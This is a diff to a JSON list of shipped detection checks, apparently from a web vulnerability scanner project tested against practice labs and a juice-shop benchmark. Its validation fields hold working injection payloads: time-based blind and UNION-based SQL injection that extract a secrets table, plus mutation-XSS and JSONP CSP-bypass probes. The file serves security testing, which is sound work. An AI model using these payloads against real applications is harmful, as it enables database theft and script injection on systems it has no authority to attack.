@@ -2,6 +2,24 @@
   "candidates": [
     {
       "source": "discovery:sqli.vulnlab.dev",
+      "slug": "sqli-vulnlab-blind-time-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /blind-time/?username=nonexistent' UNION SELECT IF(SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-time'),1,1)='V', SLEEP(3), 'x')-- delays ~3s vs 'Z' ~0.07s; sqli.vulnlab.dev/blind-time findings 6 with +sqli-vulnlab-blind-time-live-oracle; benchmark juice-shop 32 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:xss.vulnlab.dev",
+      "slug": "xss-vulnlab-mxss-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /mxss/?comment=thugirMxssProbe renders preview.innerHTML = tpl.innerHTML round-trip after regex sanitizer; xss.vulnlab.dev/mxss findings 5→8 (+mxss live + route); benchmark 32 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:xss.vulnlab.dev",
+      "slug": "xss-vulnlab-csp-bypass-jsonp-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: /csp-bypass/jsonp?cb=thugirCspJsonpProbe7 returns executable callback under script-src 'self' CSP; xss.vulnlab.dev/csp-bypass/ findings 6→8 (+jsonp live + route); benchmark 32 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:sqli.vulnlab.dev",
       "slug": "sqli-vulnlab-union-live-oracle",
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: GET /union/?category=widgets' UNION SELECT name, value, 0 FROM secrets-- leaks VULNLAB{sqli-union-based-extraction}; sqli.vulnlab.dev/union findings 3→6 (+sqli-vulnlab-union-live-oracle + route, replaces error-oracle FP); benchmark juice-shop 32 findings 6/6 maintained"
